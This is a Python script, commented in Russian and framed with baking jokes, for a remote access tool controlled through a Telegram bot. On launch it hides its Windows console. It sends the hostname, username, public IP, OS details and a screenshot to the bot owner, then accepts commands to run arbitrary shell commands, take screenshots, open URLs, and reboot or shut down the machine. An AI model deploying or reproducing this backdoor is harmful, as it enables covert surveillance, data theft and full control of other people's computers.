#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Пирожок - вкусное блюдо для удаленного управления
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io

# Конфигурация - ВАЖНО: использовать Secrets в GitHub
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class Pirojok:
    """Главный класс нашего пирожка"""
    
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "1.0.0"
        
    def send_message(self, chat_id, text):
        """Отправка сообщения"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            print(f"Pirojok error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        """Отправка фото"""
        try:
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": caption}
            requests.post(url, files=files, data=data, timeout=30)
        except:
            pass
    
    def get_system_info(self):
        """Сбор информации о системе"""
        info = []
        info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
        info.append(f"🍽 Версия: {self.version}")
        info.append(f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"💻 Хост: {socket.gethostname()}")
        info.append(f"👨‍🍳 Повар: {getpass.getuser()}")
        try:
            info.append(f"📍 Адрес: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"📍 Адрес: неизвестен")
        info.append(f"⚙️ Духовка: {platform.system()} {platform.release()}")
        info.append(f"🔧 Рецепт: {platform.machine()}")
        
        return "\n".join(info)
    
    def take_screenshot(self):
        """Фотография пирожка"""
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            return None
    
    def execute_command(self, command):
        """Приготовление команды"""
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.processes.append(process)
            stdout, stderr = process.communicate(timeout=30)
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}"
            return result or "✅ Пирожок готов!"
        except Exception as e:
            return f"❌ Пирожок подгорел: {str(e)}"
    
    def open_website(self, url):
        """Открыть сайт (заглянуть в другой ресторан)"""
        try:
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            if platform.system() == "Windows":
                os.system(f"start {url}")
            elif platform.system() == "Darwin":
                os.system(f"open {url}")
            else:
                os.system(f"xdg-open {url}")
            return f"✅ Открыт сайт: {url}"
        except:
            return "❌ Не удалось открыть"
    
    def reboot_system(self):
        """Перезагрузка (пирожок поднимается)"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /t 5")
            else:
                os.system("sudo reboot")
            return "✅ Пирожок перезапекается через 5 сек..."
        except:
            return "❌ Ошибка перезапекания"
    
    def shutdown_system(self):
        """Выключение (пирожок остывает)"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 5")
            else:
                os.system("sudo shutdown -h now")
            return "✅ Пирожок остывает через 5 сек..."
        except:
            return "❌ Ошибка остывания"
    
    def process_command(self, text, chat_id):
        """Обработка рецепта (команды)"""
        
        # Проверка на владельца
        if chat_id != self.owner_id:
            self.send_message(chat_id, "⛔ Этот пирожок не для вас!")
            return
        
        # Команда cmd
        if text.startswith("cmd"):
            cmd = text[3:].strip()
            if cmd:
                result = self.execute_command(cmd)
                if len(result) > 4000:
                    result = result[:4000] + "...\n(пирожок большой, обрезали)"
                self.send_message(chat_id, f"🥘 <b>Рецепт:</b>\n{result}")
            else:
                self.send_message(chat_id, "⚠️ Использование: cmd <команда>")
        
        # Команда website
        elif text.startswith("website"):
            url = text[7:].strip()
            if url:
                result = self.open_website(url)
                self.send_message(chat_id, result)
            else:
                self.send_message(chat_id, "⚠️ Использование: website <url>")
        
        # Команда reboot
        elif text == "reboot":
            self.send_message(chat_id, self.reboot_system())
        
        # Команда shutdown
        elif text == "shutdown":
            self.send_message(chat_id, self.shutdown_system())
        
        # Команда shot
        elif text == "shot":
            self.send_message(chat_id, "📸 Фоткаем пирожок...")
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(chat_id, screenshot, "🥧 Пирожок в духовке")
            else:
                self.send_message(chat_id, "❌ Не удалось сфоткать пирожок")
        
        # Команда help
        elif text == "help" or text == "menu":
            help_text = """
🥧 <b>МЕНЮ ПИРОЖКА:</b>

• cmd [команда] - приготовить команду
• website [url] - заглянуть на другой сайт
• reboot - перезапечь пирожок
• shutdown - остудить пирожок
• shot - сфоткать пирожок
• help/menu - показать меню
            """
            self.send_message(chat_id, help_text)
        
        else:
            self.send_message(chat_id, "❓ Нет такого блюда. Используйте menu")
    
    def main_loop(self):
        """Основной цикл приготовления"""
        
        # Сообщаем о готовности
        self.send_message(self.owner_id, self.get_system_info())
        time.sleep(2)
        
        # Первое фото
        screenshot = self.take_screenshot()
        if screenshot:
            self.send_photo(self.owner_id, screenshot, "🥧 Пирожок испекся!")
        
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {
                    "offset": self.last_update_id + 1,
                    "timeout": 30,
                    "allowed_updates": ["message"]
                }
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            # Каждая команда в отдельном потоке
                            thread = threading.Thread(
                                target=self.process_command,
                                args=(
                                    update["message"]["text"],
                                    update["message"]["chat"]["id"]
                                )
                            )
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except:
                pass
    
    def run(self):
        """Запуск пирожка"""
        try:
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")

if __name__ == "__main__":
    # Скрываем консоль на Windows
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Запускаем пирожок
    pirojok = Pirojok()
    pirojok.run()
